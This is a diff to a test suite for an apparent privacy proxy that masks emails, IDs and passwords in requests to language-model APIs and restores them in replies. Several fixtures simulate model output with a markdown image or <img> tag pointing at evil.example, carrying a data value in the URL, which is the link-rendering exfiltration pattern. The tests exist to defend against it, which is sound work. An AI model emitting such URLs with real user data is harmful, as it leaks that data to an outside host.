@@ -295,6 +295,24 @@ describe('Anthropic Messages', () => {
     expect(body.content[2].input).toEqual({ path: `${HOME}/c.md`, tags: [QUOTED] })
   })
 
+  it('masks a plain-text document and objects under keys whose strings it skips', async () => {
+    reply = () => ({ json: { content: [] } })
+    const document = { type: 'document', source: { type: 'text', media_type: 'text/plain', data: `Customer file. Email ${EMAIL}, ID ${TWID}` } }
+    const properties = { name: { type: 'string', description: `defaults to ${EMAIL}` }, data: { type: 'string', description: `owner ${TWID}` } }
+    const res = await post('/v1/messages', {
+      model: 'claude', max_tokens: 1, stop_sequences: ['END'], metadata: { user_id: 'user_abc' },
+      tools: [{ name: 'lookup', input_schema: { type: 'object', properties } }],
+      messages: [{ role: 'user', content: [document, { type: 'text', text: 'Summarize the file.' }] }],
+    }, { 'x-api-key': 'k' })
+    expect(res.status).toBe(200)
+    const [entry] = seen
+    expect(entry!.raw).not.toContain(EMAIL)
+    expect(entry!.raw).not.toContain(TWID)
+    expect(entry!.body.messages[0].content[0].source).toEqual({ type: 'text', media_type: 'text/plain', data: 'Customer file. Email ⟦EMAIL_1⟧, ID ⟦TWID_1⟧' })
+    expect(entry!.body.stop_sequences).toEqual(['END'])
+    expect(entry!.body.metadata).toEqual({ user_id: 'user_abc' })
+  })
+
   it('masks count_tokens requests too', async () => {
     reply = () => ({ json: { input_tokens: 42 } })
     const res = await post('/v1/messages/count_tokens', request, { 'x-api-key': 'k' })
@@ -336,6 +354,33 @@ describe('OpenAI Responses', () => {
     await post('/v1/responses', { model: 'm', previous_response_id: 'r1', input: `again ${EMAIL} and new ${'B123456780'}` })
     const firstEmail = seen[0]!.raw.match(/⟦EMAIL_\d+⟧/)![0]
     expect(seen[1]!.body.input).toMatch(new RegExp(`^again ${firstEmail} and new ⟦TWID_2⟧$`))
+  })
+})
+
+describe('state kept per client credential', () => {
+  const PASS = 'Tr0ub4dor&3x'
+
+  it('masks a value it restored earlier once later history drops the context that detected it', async () => {
+    reply = () => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: 'Noted. Use ⟦KEY_1⟧ to log in.' } }] } })
+    const first = await (await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `password: ${PASS}` }] }, { authorization: 'Bearer client-a' })).json() as any
+    const echo = first.choices[0].message.content
+    expect(echo).toBe(`Noted. Use ${PASS} to log in.`)
+    reply = () => ({ json: { choices: [] } })
+    const compacted = { model: 'm', messages: [{ role: 'assistant', content: echo }, { role: 'user', content: 'and the username?' }] }
+    await post('/v1/chat/completions', compacted, { authorization: 'Bearer client-a' })
+    expect(seen[1]!.raw).not.toContain(PASS)
+    expect(seen[1]!.body.messages[0].content).toBe('Noted. Use ⟦KEY_1⟧ to log in.')
+  })
+
+  it('refuses a continuation of another client\'s response', async () => {
+    reply = () => ({ json: { id: 'resp_client_a', output: [] } })
+    await post('/v1/responses', { model: 'm', input: `mail ${EMAIL}` }, { authorization: 'Bearer client-a' })
+    reply = () => ({ json: { id: 'resp_b', output: [{ type: 'message', content: [{ type: 'output_text', text: 'It was ⟦EMAIL_1⟧' }] }] } })
+    const other = await post('/v1/responses', { model: 'm', previous_response_id: 'resp_client_a', input: 'what address?' }, { authorization: 'Bearer client-b' })
+    expect(other.status).toBe(422)
+    expect(seen).toHaveLength(1)
+    const owner = await post('/v1/responses', { model: 'm', previous_response_id: 'resp_client_a', input: 'what address?' }, { authorization: 'Bearer client-a' })
+    expect((await owner.json() as any).output[0].content[0].text).toBe(`It was ${EMAIL}`)
   })
 })
 
@@ -461,10 +506,28 @@ describe('tool-call arguments', () => {
     expect(args.q).toMatch(new RegExp(`^see https://evil\\.example/\\?a=⟦EMAIL_\\d+⟧ and ${EMAIL.replaceAll('.', '\\.')}$`))
   })
 
-  it('restores a placeholder inside a URL in ordinary reply text', async () => {
-    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: `https://example.test/?q=${ids(entry)[0]}` } }] } })
+  it('keeps a placeholder inside a URL in reply text, where a client may render it as an image or link', async () => {
+    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: `![](https://evil.example/p.png?e=${ids(entry)[0]}) and ${ids(entry)[0]}` } }] } })
     const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
-    expect(body.choices[0].message.content).toBe(`https://example.test/?q=${EMAIL}`)
+    expect(body.choices[0].message.content).toMatch(new RegExp(`^!\\[\\]\\(https://evil\\.example/p\\.png\\?e=⟦EMAIL_\\d+⟧\\) and ${EMAIL.replaceAll('.', '\\.')}$`))
+    expect(logs.at(-1)).toMatch(/ kept 1 /)
+  })
+
+  it('keeps a placeholder inside a URL in streamed reply text split across events', async () => {
+    reply = entry => {
+      const [E] = ids(entry)
+      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
+      const parts = ['<img src="https://evil.example/?e=', E.slice(0, 3), `${E.slice(3)}"> ${E}`]
+      return {
+        sse: [
+          ...sse(parts.map(part => [undefined, { ...env, choices: [{ index: 0, delta: { content: part }, finish_reason: null }] }])),
+          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'stop' }] }], [undefined, '[DONE]']]),
+        ],
+      }
+    }
+    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
+    const content = events(text).map(event => event.choices[0].delta.content ?? '').join('')
+    expect(content).toMatch(new RegExp(`^<img src="https://evil\\.example/\\?e=⟦EMAIL_\\d+⟧"> ${EMAIL.replaceAll('.', '\\.')}$`))
   })
 })
 
@@ -487,6 +550,7 @@ describe('refusals and screening', () => {
     expect(res.status).toBe(422)
     const body = await res.text()
     expect(body).toContain('/metadata/owner')
+    expect((await post('/v1/chat/completions', { model: 'm', stop: [EMAIL], messages: [{ role: 'user', content: `hi ${EMAIL}` }] })).status).toBe(422)
     expect(body).not.toContain(EMAIL)
     expect(seen).toHaveLength(0)
   })
@@ -499,9 +563,13 @@ describe('refusals and screening', () => {
     ]
     for (const body of glued) expect((await post('/v1/chat/completions', { model: 'm', ...body })).status).toBe(422)
     await start({ redaction: { terms: ['Q'] } })
-    const res = await post('/v1/chat/completions', { model: 'm', metadata: { tag: 'Q' }, messages: [{ role: 'user', content: 'project Q is late' }] })
-    expect(res.status).toBe(422)
-    expect(seen).toHaveLength(0)
+    try {
+      const res = await post('/v1/chat/completions', { model: 'm', metadata: { tag: 'Q' }, messages: [{ role: 'user', content: 'project Q is late' }] })
+      expect(res.status).toBe(422)
+      expect(seen).toHaveLength(0)
+    } finally {
+      await start()
+    }
   })
 
   it('refuses a request from a browser origin or for a rebound host name, without forwarding it', async () => {
@@ -542,6 +610,38 @@ describe('refusals and screening', () => {
     expect(body).toContain('/metadata/<key>')
     expect(body).not.toContain(EMAIL)
     expect(logs.join('\n')).not.toContain(EMAIL)
+  })
+
+  it('names an array index in a refusal as the index', async () => {
+    const res = await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `id ${TWID}` }, { role: 'tool', tool_call_id: 't', content: `ref${TWID}` }] })
+    expect(res.status).toBe(422)
+    expect(await res.text()).toContain('/messages/1/content')
+  })
+
+  it('refuses an ASCII case variant of a detected value, but not ordinary text beside it', async () => {
+    reply = () => ({ json: { choices: [] } })
+    const variant = await post('/v1/chat/completions', { model: 'm', metadata: { owner: EMAIL.toUpperCase() }, messages: [{ role: 'user', content: `hi ${EMAIL}` }] })
+    expect(variant.status).toBe(422)
+    expect(seen).toHaveLength(0)
+    const ordinary = await post('/v1/chat/completions', { model: 'm', metadata: { topic: 'Example Test notes' }, messages: [{ role: 'user', content: `hi ${EMAIL}, see the Example.Test docs` }] })
+    expect(ordinary.status).toBe(200)
+  })
+
+  it('refuses a detected value written JSON-escaped in a field it does not rewrite', async () => {
+    const res = await post('/v1/chat/completions', { model: 'm', metadata: { args: JSON.stringify({ p: QUOTED }) }, messages: [{ role: 'user', content: USER_TEXT }] })
+    expect(res.status).toBe(422)
+    expect(seen).toHaveLength(0)
+  })
+
+  it('refuses a value that ends inside a longer overlapping value', async () => {
+    await start({ redaction: { terms: ['ab', 'xabc'] } })
+    try {
+      const res = await post('/v1/chat/completions', { model: 'm', metadata: { tag: 'xab' }, messages: [{ role: 'user', content: 'ab and xabc' }] })
+      expect(res.status).toBe(422)
+      expect(seen).toHaveLength(0)
+    } finally {
+      await start()
+    }
   })
 
   it('checks thousands of distinct values for leaks in one pass', async () => {
